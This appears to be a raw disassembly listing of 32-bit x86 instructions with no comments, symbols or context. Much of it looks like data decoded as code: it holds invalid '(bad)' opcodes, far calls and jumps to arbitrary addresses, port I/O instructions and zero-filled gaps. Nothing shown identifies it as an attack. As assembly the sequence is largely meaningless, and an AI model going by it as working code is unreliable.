  416423:	xor    DWORD PTR ds:0x5525348,0x23
  41642a:	gs push edx
  41642c:	push   ecx
  41642d:	pop    es
  41642e:	xor    eax,DWORD PTR [eax+0x53]
  416431:	cmp    eax,0x17253169
  416436:	pop    edi
  416437:	xor    DWORD PTR [ecx-0x19],edx
  41643a:	aas    
  41643b:	or     al,0x52
  41643d:	xor    esp,DWORD PTR [edx+edx*1]
  416440:	pusha  
  416441:	sbb    DWORD PTR [esi+0x0],edx
  416444:	push   ebx
  416445:	(bad)  
  416446:	xor    esi,DWORD PTR [ecx+edx*2]
  416449:	inc    DWORD PTR [ebx]
	...
  416457:	add    BYTE PTR [eax],al
  416459:	add    BYTE PTR [edi],bl
  41645b:	sbb    bl,BYTE PTR fs:[eax+0x43]
  41645f:	xor    cl,BYTE PTR [edx+edx*2]
  416462:	cmc    
  416463:	pop    edi
  416464:	stc    
  416465:	and    ecx,DWORD PTR [edi]
  416467:	dec    esp
  416468:	imul   DWORD PTR [eax+0x63]
  41646b:	aas    
  41646c:	adc    esi,DWORD PTR [ebx+eax*2]
  41646f:	aaa    
  416470:	enter  0xc455,0x5e
  416474:	enter  0xc657,0x53
  416478:	out    0x45,eax
  41647a:	mov    bh,0x35
  41647c:	pop    es
  41647d:	inc    ebx
  41647e:	mov    dh,0x58
  416480:	aam    0x64
  416482:	int    0x61
  416484:	les    edx,FWORD PTR [ecx+0x63]
  416487:	pop    edi
  416488:	add    BYTE PTR [ebp-0x4598a670],bh
  41648e:	mov    WORD PTR [edi],ss
  416490:	je     0x416433
  416492:	mov    ah,0x5
  416494:	pop    esp
  416495:	stos   DWORD PTR es:[edi],eax
  416496:	mov    ebx,0xb48c6c59
  41649b:	xor    eax,0x5fa57e72
  4164a0:	and    BYTE PTR [edx+0x76745f9d],bl
  4164a6:	jg     0x4164fb
  4164a8:	arpl   cx,bp
  4164aa:	dec    esi
  4164ab:	popa   
  4164ac:	pop    edi
  4164ad:	jne    0x41650f
  4164af:	pop    ss
  4164b0:	bound  ebx,QWORD PTR [ecx+0x30]
  4164b3:	add    eax,0x513d4e51
  4164b8:	jne    0x416502
  4164ba:	xor    DWORD PTR [edx+0x5c],esp
  4164bd:	sub    eax,DWORD PTR [eax]
	...
  4164cb:	add    BYTE PTR [eax],al
  4164cd:	(bad)  
  4164ce:	aas    
  4164cf:	push   esp
  4164d0:	sbb    DWORD PTR [ebx+0x43],esi
  4164d3:	jae    0x416522
  4164d5:	inc    ebx
  4164d6:	bound  esi,QWORD PTR [ecx+ecx*1+0x77]
  4164da:	push   ebx
  4164db:	ins    DWORD PTR es:[edi],dx
  4164dc:	ds cmp eax,0x573d4625
  4164e2:	sub    DWORD PTR [ebx+0x8],ecx
  4164e5:	ss push edi
  4164e7:	add    BYTE PTR [edx],bh
  4164e9:	sub    al,0x5f
  4164eb:	je     0x416503
  4164ed:	(bad)  
  4164ee:	push   edx
  4164ef:	arpl   WORD PTR ds:0xd6c5221,sp
  4164f5:	or     dl,BYTE PTR [ecx+0x50]
  4164f8:	sti    
  4164f9:	or     eax,0x31c96658
  4164fe:	pop    eax
  4164ff:	fnsavew [ebp-0x7b3b8d9c]
  416506:	inc    edi
  416507:	jae    0x4164ce
  416509:	lods   al,BYTE PTR ds:[esi]
  41650a:	sub    BYTE PTR [ecx+edi*4-0x4e],dh
  41650e:	xor    ch,BYTE PTR [ebp+0x0]
  416511:	sub    al,0xe9
  416513:	inc    ebp
  416514:	push   esp
  416515:	(bad)  
  416517:	ds ins BYTE PTR es:[edi],dx
  416519:	and    ebp,DWORD PTR [esi]
  41651b:	outs   dx,BYTE PTR ds:[esi]
  41651c:	je     0x4164f4
  41651e:	inc    ebp
  41651f:	pop    ebp
  416520:	imul   esi,esp,0xdc6f4f08
  416526:	pop    esp
  416527:	jae    0x41658a
  416529:	call   0xca83c15b
  41652e:	dec    edx
  41652f:	push   esp
  416530:	push   eax
	...
  41653d:	add    BYTE PTR [eax],al
  41653f:	add    dh,al
  416541:	inc    esi
  416542:	jno    0x4165b0
  416544:	out    0x2d,al
  416546:	je     0x416568
  416548:	retf   0x6b56
  41654b:	outs   dx,DWORD PTR ds:[esi]
  41654c:	fsub   st(0),st
  41654e:	inc    ebp
  41654f:	push   esp
  416550:	call   0x6b60:0x2e704af5
  416557:	outs   dx,BYTE PTR ds:[esi]
  416558:	sub    DWORD PTR [ecx],ecx
  41655a:	dec    edi
  41655b:	outs   dx,DWORD PTR ds:[esi]
  41655c:	sbb    al,0x5d
  41655e:	jae    0x4165c1
  416560:	js     0x41658e
  416562:	pop    esp
  416563:	inc    edx
  416564:	outs   dx,DWORD PTR ds:[esi]
  416565:	and    eax,0xf96e656c
  41656a:	jno    0x4165db
  41656c:	sub    esp,DWORD PTR gs:[eax]
  41656f:	push   ebx
  416570:	jne    0x41659d
  416572:	je     0x4165eb
  416574:	imul   edx,DWORD PTR [edi+0x61],0x5c
  416578:	cmp    BYTE PTR [esp+ebp*2+0x6c],bl
  41657c:	pop    edi
  41657d:	pop    ebp
  41657e:	push   eax
  41657f:	jb     0x4165d6
  416581:	bound  esp,QWORD PTR [esi+0x20]
  416584:	cmp    al,0xfd
  416586:	dec    edi
  416587:	and    BYTE PTR [ecx],bh
  416589:	and    eax,0x5c646565
  41658e:	pop    esp
  41658f:	dec    edi
  416590:	cmp    bl,BYTE PTR [ebp+eiz*2+0x6f]
  416594:	and    al,0x55
  416596:	add    BYTE PTR [ebx+0x63],dl
  416599:	retf   
  41659a:	arpl   WORD PTR [esp+ecx*8-0x33],si
  41659e:	dec    edi
  41659f:	arpl   WORD PTR [edi+0x463170],bx
	...
  4165b1:	add    BYTE PTR [eax],al
  4165b3:	(bad)  
  4165b4:	sahf   
  4165b5:	add    DWORD PTR [edx+eax*8+0x7f],ecx
  4165b9:	push   ebp
  4165ba:	push   ecx
  4165bb:	mov    esi,0x8c67507f
  4165c0:	pushf  
  4165c1:	inc    ebx
  4165c2:	xchg   DWORD PTR [bx+di+0x5101],ecx
  4165c7:	jp     0x41656b
  4165c9:	data16 jno 0x41656b
  4165cc:	test   DWORD PTR [edi+0x0],ecx
  4165cf:	stos   BYTE PTR es:[edi],al
  4165d0:	pushf  
  4165d1:	push   eax
  4165d2:	je     0x416556
  4165d4:	xchg   edx,eax
  4165d5:	pop    ebp
  4165d6:	inc    esp
  4165d7:	jp     0x416619
  4165d9:	adc    al,BYTE PTR [eax]
  4165db:	xor    eax,0x636c5e36
  4165e0:	dec    edx
  4165e1:	das    
  4165e2:	imul   eax,DWORD PTR [edx+0x60],0x58
  4165e6:	inc    esi
  4165e7:	aaa    
  4165e8:	inc    BYTE PTR [ebx]
  4165ea:	inc    esi
  4165eb:	inc    edx
  4165ec:	pop    esp
  4165ed:	pop    ebx
  4165ee:	jb     0x41663a
  4165f0:	add    ah,BYTE PTR [ebp+0x71]
  4165f3:	test   DWORD PTR [edx+0x61],ecx
  4165f6:	je     0x41665b
  4165f8:	out    0x58,al
  4165fa:	jno    0x41662b
  4165fc:	add    edx,DWORD PTR [edx+0x77]
  4165ff:	dec    ebp
  416600:	adc    ah,BYTE PTR [ecx+0x74]
  416603:	arpl   WORD PTR ds:0x10116468,cx
  416609:	push   edi
  41660a:	dec    DWORD PTR cs:[eax+ebx*2]
  41660e:	add    dl,dh
  416610:	rcr    BYTE PTR [edx+0x61],0x8
  416614:	aam    0x65
  416616:	pop    edi
	...
  416623:	add    BYTE PTR [eax],al
  416625:	add    bh,dh
  416627:	lods   eax,DWORD PTR ds:[esi]
  416628:	sub    eax,0x5fbfee54
  41662d:	ins    DWORD PTR es:[edi],dx
  41662e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41662f:	add    eax,0x566333bb
  416634:	into   
  416635:	xlat   BYTE PTR gs:[ebx]
  416637:	cmp    cl,al
  416639:	push   ecx
  41663a:	shl    BYTE PTR [ecx-0x4d],0x56
  41663e:	mov    cl,0x27
  416640:	(bad)  
  416641:	inc    ebp
  416642:	(bad)  
  416643:	push   ebp
  416644:	out    0x5a,eax
  416646:	mov    ebp,0xb762bb36
  41664b:	xor    DWORD PTR [edi-0x18d2689e],esi
  416651:	xor    BYTE PTR [esi-0x53ab6cd5],al
  416657:	aaa    
  416658:	mov    WORD PTR [edi],gs
  41665a:	mov    dl,0x32
  41665c:	xchg   ebx,eax
  41665d:	bound  ebx,QWORD PTR [edi-0x70ba52b5]
  416663:	push   ebp
  416664:	out    0x40,eax
  416666:	jno    0x416690
  416668:	mov    esp,DWORD PTR [esi+0x75]
  41666b:	cmp    DWORD PTR [eax+0x48564f62],eax
  416671:	pop    eax
  416672:	dec    edi
  416673:	add    eax,0x2940562a
  416678:	dec    esp
  416679:	pop    edx
  41667a:	dec    edi
  41667b:	sub    al,0x48
  41667d:	pop    eax
  41667e:	and    ch,BYTE PTR ds:0x54a674c
  416684:	sbb    bl,BYTE PTR [ebx+0x45]
  416687:	cmp    DWORD PTR [esi],edi
  416689:	add    BYTE PTR gs:[eax],al
	...
  416698:	add    BYTE PTR [ecx],dh
  41669a:	sub    BYTE PTR [ebx],cl
  41669c:	aaa    
  41669d:	push   cs
  41669e:	cmp    DWORD PTR [eax],ecx
  4166a0:	sub    BYTE PTR ds:0x3330254b,bl
  4166a6:	popa   
  4166a7:	es push esp
  4166a9:	cvttps2pi mm7,xmm6
  4166ac:	pop    ecx
  4166ad:	repnz add al,0x17
  4166b0:	gs repnz xor eax,0x28f15af6
  4166b7:	add    cl,ch
  4166b9:	xor    esi,DWORD PTR [ebx+eiz*2]
  4166bc:	sti    
  4166bd:	call   0x6d4d:0x60cc6b62
  4166c4:	ficomp DWORD PTR [edx+eax*1+0x5addb64]
  4166cb:	push   edx
  4166cc:	les    ebx,FWORD PTR [ebx+0x74cc7430]
  4166d2:	sub    dh,BYTE PTR [edx-0x17]
  4166d5:	jo     0x416707
  4166d7:	jb     0x416696
  4166d9:	pusha  
  4166da:	dec    ebp
  4166db:	ins    DWORD PTR es:[edi],dx
  4166dc:	mov    edx,0x945f53ac
  4166e1:	add    DWORD PTR ds:0x39b68e50,0x0
  4166e8:	mov    esp,0x7f7226ad
  4166ed:	xchg   DWORD PTR [esi],ebp
  4166ef:	arpl   cx,bp
  4166f1:	xor    BYTE PTR [edx+0x71],ah
  4166f4:	jp     0x416687
  4166f6:	xor    BYTE PTR [edx-0x73],dh
  4166f9:	pusha  
  4166fa:	dec    ebp
  4166fb:	ins    DWORD PTR es:[edi],dx
  4166fc:	jp     0x4166fe
	...
  41670a:	add    BYTE PTR [eax],al
  41670c:	sub    al,0x49
  41670e:	addr16 pop ebx
  416710:	cdq    
  416711:	bound  ebp,QWORD PTR [ebx+0x44]
  416714:	addr16 push esp
  416716:	ins    DWORD PTR es:[edi],dx
  416717:	dec    edi
  416718:	xor    edi,DWORD PTR [eax]
  41671a:	pop    edi
  41671b:	pop    ebx
  41671c:	inc    edx
  41671d:	popa   
  41671e:	inc    ecx
  41671f:	push   esi
  416720:	inc    ecx
  416721:	sub    esp,DWORD PTR [ebx+0x44]
  416724:	and    al,0x36
  416726:	jo     0x416731
  416728:	ins    BYTE PTR es:[edi],dx
  416729:	xor    BYTE PTR [esi+0x35],ah
  41672c:	xor    BYTE PTR [edx+0x72],ah
  41672f:	or     al,0x4b
  416731:	dec    edx
  416732:	outs   dx,BYTE PTR ds:[esi]
  416733:	adc    eax,0xc6e3702
  416738:	xor    esp,DWORD PTR [ecx+0x50]
  41673b:	sbb    ebx,DWORD PTR [eax]
  41673d:	sub    esp,DWORD PTR [edi+0x0]
  416740:	dec    esi
  416741:	and    al,0x6f
  416743:	add    BYTE PTR [ecx+0x5e],cl
  416746:	data16 je 0x4167ae
  416749:	sub    BYTE PTR [edx+0x65],dh
  41674c:	outs   dx,BYTE PTR ds:[esi]
  41674d:	inc    ebx
  41674e:	push   esp
  41674f:	push   eax
  416750:	adc    eax,0xe65722a
  416755:	dec    eax
  416756:	dec    ebx
  416757:	push   edx
  416758:	test   DWORD PTR [esi+0x54],0x64f80e50
  41675f:	je     0x416788
  416761:	pop    eax
  416762:	add    BYTE PTR [eax+0x1d],cl
  416765:	pop    eax
  416766:	je     0x416768
  416768:	(bad)  
  416769:	push   edi
  41676a:	popa   
  41676b:	jb     0x416777
  41676d:	cmc    
  41676e:	push   0x72
	...
  41677c:	add    BYTE PTR [eax],al
  41677e:	add    dh,dh
  416780:	add    al,0x50
  416782:	push   edi
  416783:	cli    
  416784:	hlt    
  416785:	jae    0x4167ef
  416787:	enter  0x4f04,0x53
  41678b:	ret    0x7004
  41678e:	jb     0x41675d
  416790:	es gs ins BYTE PTR es:[edi],dx
  416793:	out    0x57,eax
  416795:	cs js  0x416777
  416798:	pop    eax
  416799:	add    BYTE PTR [esp+eax*1-0xf],bl
  41679d:	dec    edi
  41679e:	and    BYTE PTR [edi+0x1d6c7051],al
  4167a4:	push   edi
  4167a5:	popa   
  4167a6:	jb     0x416762
  4167a8:	stc    
  4167a9:	push   0x66
  4167ab:	push   ss
  4167ac:	push   esi
  4167ad:	pop    ebp
  4167ae:	jb     0x4167d7
  4167b0:	in     eax,dx
  4167b1:	inc    ebp
  4167b2:	push   esp
  4167b3:	dec    edx
  4167b4:	jmp    0x5dabdff9
  4167b9:	imul   esi,DWORD PTR [edx+0x27],0x57
  4167bd:	pop    esp
  4167be:	inc    esi
  4167bf:	push   esi
  4167c0:	stc    
  4167c1:	pop    ds
  4167c2:	inc    ebp
  4167c3:	inc    edx
  4167c4:	pop    ecx
  4167c5:	ins    BYTE PTR es:[edi],dx
  4167c6:	outs   dx,DWORD PTR ds:[esi]
  4167c7:	arpl   WORD PTR [ebx*2+0x56f71f72],bx
  4167ce:	jb     0x4167d8
  4167d0:	mov    ebx,0x9005f51
  4167d5:	sub    BYTE PTR [ebx+0x1d],cl
  4167d8:	jmp    0x416809
  4167da:	ins    DWORD PTR es:[edi],dx
  4167db:	int3   
  4167dc:	ret    0x5f43
  4167df:	rcr    DWORD PTR [ecx],1
  4167e1:	push   ss
  4167e2:	xor    al,BYTE PTR [eax]
	...
  4167f0:	add    BYTE PTR [eax],al
  4167f2:	xchg   edi,eax
  4167f3:	scas   al,BYTE PTR es:[edi]
  4167f4:	inc    ebx
  4167f5:	jae    0x4167c6
  4167f7:	loop   0x416851
  4167f9:	outs   dx,BYTE PTR ds:[esi]
  4167fa:	mov    al,0xae
  4167fc:	xor    al,0x6d
  4167fe:	mov    ebp,0xb15f5082
  416803:	leave  
  416804:	and    eax,0x219e8f46
  416809:	inc    ebx
  41680a:	fwait
  41680b:	jle    0x416862
  41680d:	ins    DWORD PTR es:[edi],dx
  41680e:	xchg   ecx,eax
  41680f:	xchg   ecx,eax
  416810:	push   ebx
  416811:	pop    esp
  416812:	mov    bl,0x9c
  416814:	pop    eax
  416815:	data16 jp 0x4167a2
  416818:	pop    esi
  416819:	jno    0x41687e
  41681b:	jle    0x41687f
  41681d:	jno    0x41688f
  41681f:	aas    
  416820:	pop    eax
  416821:	jb     0x4167aa
  416823:	scas   al,BYTE PTR es:[edi]
  416824:	xor    DWORD PTR [edi+0x70],ebx
  416827:	cmp    edx,DWORD PTR [eax+0x6d]
  41682a:	push   ecx
  41682b:	mov    ch,BYTE PTR ds:0x4515377
  416831:	dec    eax
  416832:	cmp    al,0x5b
  416834:	push   eax
  416835:	add    BYTE PTR [edi],dl
  416837:	inc    edi
  416838:	pop    edi
  416839:	addr16 dec ebp
  41683b:	scas   al,BYTE PTR es:[edi]
  41683c:	xor    DWORD PTR [ebp+0x31],ebp
  41683f:	add    al,BYTE PTR [edi+eax*2]
  416842:	cmp    eax,0x42675055
  416847:	dec    edx
  416848:	xor    al,0x5f
  41684a:	pop    ss
  41684b:	inc    esi
  41684c:	add    al,0x46
  41684e:	syscall 
  416850:	pop    ss
  416851:	xor    eax,0x1a043904
	...
  416862:	add    BYTE PTR [eax],al
  416864:	add    BYTE PTR [ebx],cl
  416866:	xor    al,BYTE PTR [ebx]
  416868:	add    al,0x1f
  41686a:	inc    edi
  41686b:	sbb    DWORD PTR [ebx-0x2],ebx
  41686e:	and    eax,0x5325efb
  416873:	int    0x5a
  416875:	cmc    
  416876:	sub    eax,0x24b527e7
  41687b:	std    
  41687c:	aas    
  41687d:	int3   
  41687e:	sub    cl,ah
  416880:	daa    
  416881:	mov    ds:0xbc61cd2e,al
  416886:	es mov bl,0x34
  416889:	shl    BYTE PTR [edx],0xda
  41688c:	pop    edx
  41688d:	(bad)  
  41688e:	das    
  41688f:	mov    edx,0xc4528f03
  416894:	push   esp
  416895:	mov    dl,0x2c
  416897:	(bad)  
  416898:	pop    ecx
  416899:	xchg   edx,eax
  41689a:	add    eax,0x397d589a
  41689f:	sahf   
  4168a0:	bound  edx,QWORD PTR [ecx-0x5bce44d8]
  4168a6:	das    
  4168a7:	stos   DWORD PTR es:[edi],eax
  4168a8:	dec    edx
  4168a9:	mov    ch,BYTE PTR [eax]
  4168ab:	stos   DWORD PTR es:[edi],eax
  4168ac:	xor    al,0x80
  4168ae:	and    bh,BYTE PTR [ebp+edx*2-0x80]
  4168b2:	inc    edi
  4168b3:	lahf   
  4168b4:	add    esp,DWORD PTR [edx+0x4461852e]
  4168ba:	es (bad) 
  4168bc:	xor    esi,DWORD PTR [ecx+edi*1]
  4168bf:	dec    edi
  4168c0:	add    al,0x30
  4168c2:	xor    DWORD PTR [ebx+0x52],edx
  4168c5:	and    al,0x47
  4168c7:	das    
  4168c8:	xor    al,0x0
	...
  4168d6:	add    BYTE PTR [eax],al
  4168d8:	arpl   WORD PTR [ecx+0x5a],sp
  4168db:	pop    ebp
  4168dc:	das    
  4168dd:	sub    BYTE PTR [edx],bh
  4168df:	push   ss
  4168e0:	sub    esi,DWORD PTR [eax]
  4168e2:	dec    ebx
  4168e3:	add    al,0x7
  4168e5:	inc    edi
  4168e6:	add    BYTE PTR ds:0x3a735357,bl
  4168ec:	aaa    
  4168ed:	add    eax,0x2d301c52
  4168f2:	push   ecx
  4168f3:	adc    BYTE PTR [ebx],dh
  4168f5:	and    ch,BYTE PTR [esi]
  4168f7:	adc    DWORD PTR [edx],ebx
  4168f9:	xor    DWORD PTR [eax],eax
  4168fb:	cmp    al,BYTE PTR [edx]
  4168fd:	xor    esi,DWORD PTR [esi+0xc]
  416900:	adc    DWORD PTR ds:0x3303fa53,eax
  416906:	outs   dx,BYTE PTR ds:[esi]
  416907:	or     BYTE PTR [edx-0x41e6ffde],bh
  41690d:	xor    al,0x71
  41690f:	fidiv  WORD PTR [ebp-0x79169bcd]
  416915:	cmp    DWORD PTR [eax-0x47],esi
  416918:	xchg   ebp,eax
  416919:	xor    esi,DWORD PTR [ecx+ebp*8+0x71]
  41691d:	xor    BYTE PTR [esi-0x43],ah
  416920:	popf   
  416921:	pop    esi
  416922:	jb     0x4168e8
  416924:	jl     0x41696a
  416926:	jb     0x4168d8
  416928:	xor    DWORD PTR [ebx],0x5c
  41692b:	xchg   esi,eax
  41692c:	and    DWORD PTR [ebx],0x51
  41692f:	nop
  416930:	pushf  
  416931:	and    dl,BYTE PTR [eax-0x6c]
  416934:	xor    BYTE PTR [ecx],0x67
  416937:	call   0x0:0xe9722298
	...
  41694a:	add    BYTE PTR [ebx+eax*2],bh
  41694d:	addr16 jge 0x416979
  416950:	outs   dx,BYTE PTR es:[esi]
  416952:	test   BYTE PTR [eax+0x2c806205],bl
  416958:	sub    al,0x67
  41695a:	jg     0x41699f
  41695c:	cmp    eax,0x5304d2e
  416961:	dec    eax
  416962:	dec    esi
  416963:	xor    BYTE PTR [ecx],bh
  416965:	outs   dx,BYTE PTR ds:[esi]
  416966:	dec    eax
  416967:	sbb    ah,BYTE PTR [edx]
  416969:	add    BYTE PTR [eax+edx*1],dh
  41696c:	and    dh,BYTE PTR [edx+0x0]
  41696f:	adc    al,0x28
  416971:	imul   esp,DWORD PTR [ebp-0x46],0x59735cf1
  416978:	dec    esi
  416979:	imul   esi,DWORD PTR [edx+0x1e],0x9
  41697d:	push   eax
  41697e:	outs   dx,DWORD PTR ds:[esi]
  41697f:	push   0x55530055
  416984:	pop    edi
  416985:	je     0x4169fe
  416987:	imul   edx,DWORD PTR [ebx+0x61],0x5c
  41698b:	aas    
  41698c:	push   ecx
  41698d:	jo     0x4169f0
  41698f:	push   esp
  416990:	inc    ebp
  416991:	jb     0x4169fc
  416993:	ins    BYTE PTR es:[edi],dx
  416994:	and    al,0x5c
  416996:	push   ebx
  416997:	outs   dx,DWORD PTR ds:[esi]
  416998:	pop    eax
  416999:	outs   dx,DWORD PTR ds:[esi]
  41699a:	imul   edx,DWORD PTR [ebp+0x53],0x4626006f
  4169a1:	js     0x416a13
  4169a3:	sbb    edx,DWORD PTR [ebx+0x44]
  4169a6:	jb     0x4169cb
  4169a8:	dec    ebx
  4169a9:	popa   
  4169aa:	add    BYTE PTR [esi],al
  4169ac:	pop    ebp
  4169ad:	jb     0x416a18
	...
  4169bb:	add    BYTE PTR [eax],al
  4169bd:	add    ah,ch
  4169bf:	and    eax,0x58102e6f
  4169c4:	add    BYTE PTR [edx],ah
  4169c6:	fisub  DWORD PTR [ecx]
  4169c8:	outs   dx,DWORD PTR ds:[esi]
  4169c9:	jae    0x416998
  4169cb:	push   ebx
  4169cc:	jb     0x416a32
  4169ce:	sbb    cl,ch
  4169d0:	cmp    DWORD PTR [eax],esp
  4169d2:	sbb    BYTE PTR [ecx],cl
  4169d4:	and    ch,BYTE PTR [edx+ecx*1]
  4169d7:	clc    
  4169d8:	push   0x66
  4169da:	into   
  4169db:	dec    ebx
  4169dc:	pop    ebp
  4169dd:	jb     0x4169be
  4169df:	in     al,0x40
  4169e1:	js     0x416a4d
  4169e3:	and    DWORD PTR [esi+0x44],ebp
  4169e6:	pop    eax
  4169e7:	pop    ecx
  4169e8:	jbe    0x416a4f
  4169ea:	retf   0x7845
  4169ed:	jo     0x416a0a
  4169ef:	push   ebx
  4169f0:	inc    esp
  4169f1:	jb     0x416a26
  4169f3:	dec    ebx
  4169f4:	popa   
  4169f5:	pop    edi
  4169f6:	arpl   si,sp
  4169f8:	push   edx
  4169f9:	imul   edi,DWORD PTR [esi],0xffffffae
  4169fc:	xor    BYTE PTR [ebx+0x31],ah
  4169ff:	cld    
  416a00:	pop    esp
  416a01:	jb     0x416a66
  416a03:	adc    DWORD PTR [edi+0x63],ecx
  416a06:	adc    esp,esp
  416a08:	pusha  
  416a09:	imul   edi,esi,0xffffffad
  416a0c:	xor    DWORD PTR [edi+0x10],ebx
  416a0f:	pop    ds
  416a10:	dec    ebx
  416a11:	ins    DWORD PTR es:[edi],dx
  416a12:	adc    DWORD PTR [edx],eax
  416a14:	add    al,0x5d
  416a16:	adc    ecx,DWORD PTR ds:0xbaec714f
  416a1c:	dec    edi
  416a1d:	fs arpl dx,bp
  416a20:	pop    eax
  416a21:	jb     0x416a23
	...
  416a2f:	add    BYTE PTR [eax],al
  416a31:	dec    BYTE PTR [esi]
  416a33:	push   eax
  416a34:	ins    DWORD PTR es:[edi],dx
  416a35:	shl    DWORD PTR [ebp+0x4c45101],1
  416a3b:	push   eax
  416a3c:	jne    0x416a00
  416a3e:	loopne 0x416a9e
  416a40:	pop    esp
  416a41:	xchg   ebp,eax
  416a42:	outs   dx,DWORD PTR ds:[esi]
  416a43:	cmp    DWORD PTR [eax],esp
  416a45:	nop
  416a46:	ret    
  416a47:	pop    ebx
  416a48:	je     0x4169f6
  416a4a:	int    0x4f
  416a4c:	arpl   WORD PTR [edi-0x4fa0aa91],cx
  416a52:	jg     0x416aae
  416a54:	popa   
  416a55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a56:	call   0x3f31:0x929d5c31
  416a5d:	or     BYTE PTR [edi-0x6d8a8cac],0x50
  416a64:	add    BYTE PTR [ebp+0x7e51519a],ah
  416a6a:	mov    al,ds:0xae71634b
  416a6f:	cmp    esi,DWORD PTR [ebx+esi*2-0x6f]
  416a73:	push   eax
  416a74:	arpl   WORD PTR [ecx+0x64],dx
  416a77:	bound  ebp,QWORD PTR [ebx+0x3e]
  416a7a:	scas   al,BYTE PTR es:[edi]
  416a7b:	cmp    esi,DWORD PTR [ebx+edx*2+0x5]
  416a7f:	aaa    
  416a80:	arpl   WORD PTR [edx+0x38],dx
  416a83:	push   esi
  416a84:	push   ebp
  416a85:	xor    DWORD PTR [ecx],esp
  416a87:	out    0x24,eax
  416a89:	sbb    eax,0xc345731
  416a8e:	cmp    BYTE PTR [edx],bh
  416a90:	dec    ebp
  416a91:	ss aaa 
  416a93:	inc    ebx
  416a94:	add    al,0x0
	...
  416aa2:	add    BYTE PTR [eax],al
  416aa4:	and    eax,0xfc403731
  416aa9:	ss inc esp
  416aab:	popa   
  416aac:	pop    ss
  416aad:	sub    al,0x19
  416aaf:	dec    ebx
  416ab0:	arpl   WORD PTR [eax+0x2e],bx
  416ab3:	ds pop ss
  416ab5:	push   esp
  416ab6:	sub    BYTE PTR [edx],dh
  416ab8:	and    BYTE PTR [ecx+0x1d],bl
  416abb:	inc    ecx
  416abc:	sbb    esp,ebp
  416abe:	sbb    DWORD PTR [ebp-0x3],edx
  416ac1:	xor    dh,dh
  416ac3:	(bad)  
  416ac5:	and    BYTE PTR [ebx],dl
  416ac7:	ds (bad) 
  416ac9:	sub    al,0xfd
  416acb:	pop    esp
  416acc:	scas   eax,DWORD PTR es:[edi]
  416acd:	inc    esp
  416ace:	retf   0xb660
  416ad1:	xor    ch,cl
  416ad3:	dec    edi
  416ad4:	mov    dl,0x5
  416ad6:	mov    edx,0xd631bd54
  416adb:	bound  esi,QWORD PTR [ecx-0x70c25ce0]
  416ae1:	push   ebp
  416ae2:	stos   BYTE PTR es:[edi],al
  416ae3:	push   edi
  416ae4:	test   BYTE PTR [eax],ah
  416ae6:	lds    ecx,FWORD PTR [edi-0x49]
  416ae9:	push   esi
  416aea:	ror    BYTE PTR [edi-0x80],0x36
  416aee:	out    0x30,eax
  416af0:	jbe    0x416b15
  416af2:	xchg   ebx,eax
  416af3:	dec    esp
  416af4:	pushf  
  416af5:	aaa    
  416af6:	mov    WORD PTR [edi],fs
  416af8:	xchg   edx,eax
  416af9:	sub    al,BYTE PTR [ebp-0x6a1474b1]
  416aff:	push   ecx
  416b00:	jle    0x416b5b
  416b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b03:	das    
  416b04:	xor    eax,DWORD PTR [esi+0x0]
  416b07:	test   DWORD PTR [eax],eax
	...
  416b15:	add    BYTE PTR [eax],al
  416b17:	cmp    DWORD PTR [esi],esp
  416b19:	outs   dx,BYTE PTR ds:[esi]
  416b1a:	jne    0x416aa0
  416b1c:	push   esp
  416b1d:	addr16 pop ebp
  416b1f:	jp     0x416b55
  416b21:	add    BYTE PTR [edi],cl
  416b23:	jo     0x416b62
  416b25:	popa   
  416b26:	jmp    0x3dad94dd
  416b2b:	addr16 pop ecx
  416b2d:	inc    ebp
  416b2e:	sbb    DWORD PTR [eax+ebp*1],ecx
  416b31:	xor    ax,0x5a58
  416b35:	jb     0x416b83
  416b37:	add    eax,DWORD PTR [ecx+0x67]
  416b3a:	cmp    edi,DWORD PTR [edx]
  416b3c:	and    al,0x74
  416b3e:	push   ss
  416b3f:	dec    ebp
  416b40:	xor    ah,BYTE PTR [eax]
  416b42:	cs aaa 
  416b44:	ss jno 0x416b30
  416b47:	adc    al,0x54
  416b49:	push   0x64263508
  416b4e:	sbb    bh,BYTE PTR [edx]
  416b50:	xor    DWORD PTR [eax+edx*1-0x6f],esi
  416b54:	and    BYTE PTR [ecx-0x39],dh
  416b57:	jge    0x416b7d
  416b59:	jno    0x416b44
  416b5b:	lods   al,BYTE PTR ds:[esi]
  416b5c:	push   esp
  416b5d:	push   0x64268ec8
  416b62:	mov    edx,0xc074318b
  416b67:	jb     0x416b89
  416b69:	jno    0x416b19
  416b6b:	aaa    
  416b6c:	pop    ecx
  416b6d:	xor    BYTE PTR [esi-0x359f17d5],ah
  416b73:	push   ebp
  416b74:	add    eax,0x5a489a5c
  416b79:	jb     0x416b3f
	...
  416b87:	add    BYTE PTR [eax],al
  416b89:	add    BYTE PTR [esp+edx*2+0x63],al
  416b8d:	popf   
  416b8e:	dec    esp
  416b8f:	and    ch,BYTE PTR [esi-0x7a]
  416b92:	xor    eax,0x449870eb
  416b97:	and    dh,BYTE PTR [esp+eax*4+0x60]
  416b9b:	pop    ecx
  416b9c:	push   ecx
  416b9d:	add    dl,dl
  416b9f:	loopne 0x416c12
  416ba1:	gs out 0x52,al
  416ba4:	popa   
  416ba5:	je     0x416bfd
  416ba7:	jmp    0x278ad319
  416bac:	sub    eax,0x31266a5f
  416bb1:	cs sbb eax,esi
  416bb4:	imul   ebp,DWORD PTR [ecx+0x16],0xffffffec
  416bb8:	call   FWORD PTR [ebx+0x79]
  416bbb:	mul    BYTE PTR [ebp+0x66]
  416bbe:	pop    ss
  416bbf:	in     al,dx
  416bc0:	ds jne 0x416c1d
  416bc3:	mov    eax,ds:0xfd246f50
  416bc8:	jb     0x416c2b
  416bca:	dec    eax
  416bcb:	in     al,dx
  416bcc:	jmp    FWORD PTR [ebx+0x57]
  416bcf:	loopne 0x416c40
  416bd1:	push   si
  416bd3:	icebp  
  416bd4:	push   DWORD PTR [esp+ebx*2-0xb]
  416bd8:	pusha  
  416bd9:	popa   
  416bda:	dec    edx
  416bdb:	mov    bh,0x62
  416bdd:	js     0x416c36
  416bdf:	add    DWORD PTR [edi+0x69],ebp
  416be2:	push   esi
  416be3:	out    dx,al
  416be4:	outs   dx,BYTE PTR ds:[esi]
  416be5:	cs data16 loop 0x416c5c
  416be9:	add    BYTE PTR [ecx-0x16],cl
  416bec:	jae    0x416c53
	...
  416bfa:	add    BYTE PTR [eax],al
